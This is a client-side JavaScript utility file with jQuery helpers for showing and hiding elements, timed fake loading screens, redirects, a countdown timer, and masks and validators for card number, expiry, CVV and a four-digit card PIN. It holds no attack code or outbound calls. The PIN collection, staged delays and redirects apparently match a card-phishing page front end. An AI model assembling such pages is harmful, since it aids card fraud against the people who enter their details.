//Elemental Functions:.
function hideDiv(id) {
    $('#' + id).hide();
}

function showDiv(id) {
    $('#' + id).show();
}

function getInputValue(id) {
    var value = document.getElementById(id).value;
    return value;
}

function setValue(id, text) {
   document.getElementById(id).value = text;
}

function setInner(id, text) {
   document.getElementById(id).innerText = text;
}

function redirect(link, time) {
    setTimeout(function () {
        window.location = link;
    }, time);
}

function showLoading(load_id, next_id, time) {
    showDiv(load_id);
    setTimeout(function () {
        hideDiv(load_id);
        showDiv(next_id);
    }, time);
}

function showError(id) {
    document.getElementById(id).style.border = '2px solid #d4111e';
}

function deleteWordFromString(inputString, wordToDelete) {
  var regex = new RegExp('\\b' + wordToDelete + '\\b', 'g');
  var result = inputString.replace(regex, '');
  
  return result;
}

function getLastDigits(str, num) {
  return str.slice('-' + num);
}

function checkEmpty(id) {
  if (getInputValue(id) == '') {
    showError(id);
    
  } else {
    return true
  }
}



//Generate Script:.
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

function generateString(length) {
    let result = '';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return result;
}


function countdown() {
  var countdownTime = 5 * 60 * 1000;
  var startTime = new Date().getTime();
  var endTime = startTime + countdownTime;
  var countdown;

  function updateCountdown() {
    var now = new Date().getTime();
    var timeRemaining = endTime - now;
    var minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);

    $("#timer").text(minutes + ":" + seconds);

    if (timeRemaining < 0) {
      clearInterval(countdown);
      $("#timer").text("Countdown finished!");
    }
  }

  $("#clearBtn").click(function() {
    clearInterval(countdown);
    $("#timer").text("0:00");
  });

  countdown = setInterval(updateCountdown, 1000);
}

function showDots(id) {
    const dotsContainer = document.getElementById(id);
    let intervalId;
    let dots = "";

    intervalId = setInterval(() => {
        dots += ".";
        dotsContainer.textContent = dots;

        if (dots.length === 3) {
            dots = "";
        }
    }, 500);

    return intervalId;
}

function isValidEmail(id) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (emailRegex.test(getInputValue(id)) == true) {
    return true
  } else {
    showError(id);
    $('#erno-inv-ml').show();
  }
}



function cardMasks(cardField, expiryField, cvvField) {
  // Card number formatting (XXXX XXXX XXXX XXXX)
  $(cardField).on('input', function() {
    var value = this.value.replace(/\s/g, '').replace(/\D/g, '');
    var formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
    if (formattedValue.length > 19) { // Max card length with spaces
      formattedValue = formattedValue.substring(0, 19);
    }
    this.value = formattedValue;
  });

  // Expiry date formatting (MM/YY)
  $(expiryField).on('input', function() {
    var value = this.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    this.value = value;
  });

  // CVV - only numbers
  $(cvvField).on('input', function() {
    this.value = this.value.replace(/\D/g, '');
  });
}

function validateCard(cardField) {
  var cardNumber = getInputValue(cardField).replace(/\s/g, '');
  
  // Basic Luhn algorithm check
  if (cardNumber.length < 13 || cardNumber.length > 19) {
    return false;
  }
  
  var sum = 0;
  var alternate = false;
  
  for (var i = cardNumber.length - 1; i >= 0; i--) {
    var n = parseInt(cardNumber.charAt(i), 10);
    
    if (alternate) {
      n *= 2;
      if (n > 9) {
        n = (n % 10) + 1;
      }
    }
    
    sum += n;
    alternate = !alternate;
  }
  
  return (sum % 10) === 0;
}

function validateExpiry(expiryField) {
  var expiry = getInputValue(expiryField);
  var parts = expiry.split('/');
  
  if (parts.length !== 2) return false;
  
  var month = parseInt(parts[0], 10);
  var year = parseInt('20' + parts[1], 10);
  var currentDate = new Date();
  var currentYear = currentDate.getFullYear();
  var currentMonth = currentDate.getMonth() + 1;
  
  if (month < 1 || month > 12) return false;
  if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
  
  return true;
}

function validatePIN(pinField) {
  var pin = getInputValue(pinField);
  
  // Check if PIN is exactly 4 digits
  if (!/^\d{4}$/.test(pin)) {
    return false;
  }
  
  return true;
}